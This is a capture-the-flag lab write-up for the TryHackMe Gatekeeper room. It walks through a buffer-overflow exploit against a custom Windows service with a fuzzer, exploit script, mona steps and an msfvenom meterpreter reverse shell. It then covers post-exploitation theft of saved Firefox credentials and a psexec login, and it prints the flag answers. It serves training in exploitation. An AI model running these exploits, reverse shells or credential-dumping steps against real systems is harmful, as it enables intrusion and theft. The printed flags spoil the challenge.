# [Gatekeeper](https://tryhackme.com/r/room/gatekeeper)

![Gatekeeper](./images/Gatekeeper.png)

[Gatekeeper](https://tryhackme.com/r/room/gatekeeper) is listed as an medium room. Can you get past the gate and through the fire? An overview of what we’ll be using is listed here:

* Nmap
* SMBclient
* Python
* Metasploit
* firefox_decrypt
* psexec.py

## Task 1 - Approach the Gates

Deploy the machine when you are ready to release the Gatekeeper.

**Writeups will not be accepted for this challenge**

### Answer the questions below

* No Answer Needed

	![task1-IP](./images/task1-IP.png)

### Enumeration

* Scan open port with **Nmap**
	
	```
	nmap $IP -A -p- -oN nmap-scan -Pn
	```
	
	![task1-nmap](./images/task1-nmap.png)

	You can see all result scan on this [file](./files/nmap-scan). We found SMB port open and 1 suspicious port open on **31337**

* Try to connect on port **31337**

	```
	nc $IP 31337
	```

	![task1-nc](./images/task1-nc.png)

	When we connect on this port, we try to send word "KakakSeram" and we get Host response "Hello KakakSeram!!!"

* Using SMBClient to list available shares on the host

	```
	smbclient -L $IP
	```

	![task1-smbclient1](./images/task1-smbclient1.png)

	We found shared folder name **Users**

* Exploring and access to folder **Users**

	```
	smbclient \\\\$IP\\Users
	```

	![task1-smbclient2](./images/task1-smbclient2.png)

	We found file **gatekeeper.exe** on folder **$IP\Users\Share**

* Download file **gatekeeper.exe**

	```
	get gatekeeper.exe
	```

	![task1-smbclient3](./images/task1-smbclient3.png)

### Exploit the program file

* Copy file **gatekeeper.exe** to VM Windows with installed **Immunity Debugger** and **mona.py.** Run **Immunity Debbuger** and open file **gatekeeper.exe**. Press **F9** to run program on **Immunity Debugger**

	![task1-debug1](./images/task1-debug1.png)

* Set `mona` working folder

	```
	!mona config -set workingfolder D:\Project\mona\%p
	```

	![task1-folder](./images/task1-folder.png)

* Fuzzing the application with `fuzzer.py`

	```
	#!/usr/share/python

	import socket, time, sys

	ip = '10.37.1.149'		# Change to IP Host
	port = 31337			# Change to Port Host
	timeout = 5

	string = "A" * 20

	try:
		s = socket.socket(socket.AF_INET, socket.SOCK_STREAM)
		s.settimeout(timeout)
		s.connect((ip, port))
		print("#### Starting Fuzzing #####")
		while True:
			print("[+] Sending " + str(len(string)) + " bytes...")
			s.send(bytes(string + '\r\n', "latin-1"))
			s.recv(1024)
			string += "A" * 20
			time.sleep(1)
	except:
		print("#### End of Fuzzing #####")
		print("Fuzzing crashed at " + str(len(string)) + " bytes")
		sys.exit(0)
		s.close()
	```

	![task1-fuzz](./images/task1-fuzz.png)

	We got program crashed at 160 bytes

* Create file `exploit.py`

	```
	import socket

	ip = "10.37.1.149"	# Change to IP target
	port = 31337		# Change to Port target

	offset = 0
	overflow = "A" * offset
	retn = ""
	padding = ""
	payload = ""

	buffer = overflow + retn + padding + payload

	s = socket.socket(socket.AF_INET, socket.SOCK_STREAM)

	try:
		s.connect((ip, port))
		print("Sending evil buffer...")
		s.send(bytes(buffer + "\r\n", "latin-1"))
		print("Done!")
	except:
		print("Could not connect.")
	```

	![task1-exploit1](./images/task1-exploit1.png)

* Create pattern with adding 40 bytes from crached program (160 + 40 = 200)

	```
	/usr/share/metasploit-framework/tools/exploit/pattern_create.rb -l 200
	```

	![task1-pattern](./images/task1-pattern.png)

* Copy our pattern to payload variable on `exploit.py`
	
	![task1-exploit2](./images/task1-exploit2.png)

* On **Immunity Debugger** press `ctrl+F2` to restart application and click `OK`. Press F2 to run application again. Run `exploit.py` script

	![task1-runexp](./images/task1-runexp.png)

	![task1-debug2](./images/task1-debug2.png)

	We got **EIP** value **39654138**

* Find offset from EIP value

	```
	/usr/share/metasploit-framework/tools/exploit/pattern_offset.rb -q 39654138
	```

	![task1-offset](./images/task1-offset.png)

	We got offset value **146**

* Now we need to generate a string of bad chars from `\x01` to `\xff` that is identical to the bytearray. Use the python script (`bytegen.py`) and run the script

	```
	for x in range(1, 256):
		print("\\x" + "{:02x}".format(x), end='')
	print()
    ```

    ![task1-byte](./images/task1-byte.png)

* Update `exploit.py` script, set the offset variable value, set the payload variable to generated string and set the retn variable to "BBBB"

	![task1-exploit3](./images/task1-exploit3.png)

* Restart **Immunity Debugger** and generate a bytearray using mona, and exclude the null byte **\x00**

	```
	!mona bytearray -b "\x00"
	```
	
	![task1-bytearray](./images/task1-bytearray.png)

* Run `exploit.py`

	![task1-runexp](./images/task1-runexp.png)

	![task1-debug3](./images/task1-debug3.png)

	We got ESP value = **007419E4**

* Compare bytearray with ESP to get badchar

	```
	!mona compare -f D:\Project\mona\gatekeeper\bytearray.bin -a 007419E4
	```

	![task1-debug4](./images/task1-debug4.png)

	We got possible badchar **00 0a** => **\x00\x0a**

* Finding a jump code

	```
	!mona jmp -r esp -cpb "\x00\x0a"
	```

	![task1-debug5](./images/task1-debug5.png)

	Note the address **080414C3** => **08 04 14 C3** => **\xc3\x14\x04\x08** written backwards since the system is little endian

* Generate a reverse shell payload using msfvenom, making sure to exclude the same bad chars that were found previously

	```
	msfvenom -p windows/meterpreter/reverse_tcp LHOST=10.17.127.223 LPORT=4444 -b "\x00\x0a" -f c
	```

	![task1-msfvenom](./images/task1-msfvenom.png)

* Update `exploit.py` script and set the payload variable to the string of generated C code, set retn variable to jump address also add variable padding to  **"\x90" * 16**`** and change IP to target machine THM

	![task1-exploit4](./images/task1-exploit4.png)

* Setup listener on our attacker machine using msfconsole

	```
	msfconsole -q -x "use exploit/multi/handler; set payload windows/meterpreter/reverse_tcp; set LHOST tun0; set LPORT 4444; exploit"
	```

	![task1-listener](./images/task1-listener.png)

* Run `exploit.py` and get the shell

	![task1-shell](./images/task1-shell.png)

## Task 2 - Defeat the Gatekeeper and pass through the fire

Defeat the Gatekeeper to break the chains.  But beware, fire awaits on the other side.

### Answer the questions below

* Locate and find the User Flag.
	
	![task2-user](./images/task2-user.png)

	**Answer : {H4lf_W4y_Th3r3}**

* Locate and find the Root Flag

	* In Desktop we found Firefox.Ink. Firefox.lnk this is shortcut icon thats meaning this machine have firefox browser. ok now press ctrl+z in meterpreter shell and choose yes kept it in background. Now press ctrl+z in meterpreter shell and choose yes kept it in background
	
		![task2-session](./images/task2-session.png)

	* Dump proses to get credentials user from Firefox using Metasploit **firefox_creds**
	
		```
		use post/multi/gather/firefox_creds
		set SESSION 5
		run
		```

		![task2-firefox](./images/task2-firefox.png)

	* Rename and move dump file
	
		```
		mv /home/kakakseram/.msf4/loot/20240731162800_default_10.10.60.199_ff.ljfn812a.cert_647379.bin cert9.db
		mv /home/kakakseram/.msf4/loot/20240731162807_default_10.10.60.199_ff.ljfn812a.cook_687245.bin cookies.sqlite
		mv /home/kakakseram/.msf4/loot/20240731162812_default_10.10.60.199_ff.ljfn812a.key4_578596.bin key4.db
		mv /home/kakakseram/.msf4/loot/20240731162816_default_10.10.60.199_ff.ljfn812a.logi_686792.bin logins.json
		```

		![task2-move](./images/task2-move.png)

	* Download and run Firefox decrypt tool
	
		```
		git clone https://github.com/unode/firefox_decrypt.git
		```

		![task2-git](./images/task2-git.png)

		```
		python firefox_decrypt.py ~/THM/Gatekeeper/
		```

		![task2-decrypt](./images/task2-decrypt.png)

		We found username and password

	* Connect to Host using **psexec.py**
	
		```
		python /usr/share/doc/python3-impacket/examples/psexec.py mayor:8CL7O1N78MdrCIsV@$IP
		```

		![task2-shel](./images/task2-shel.png)

	* Get the root file
	
		![task2-root](./images/task2-root.png)

	**Answer : {Th3_M4y0r_C0ngr4tul4t3s_U}**
	

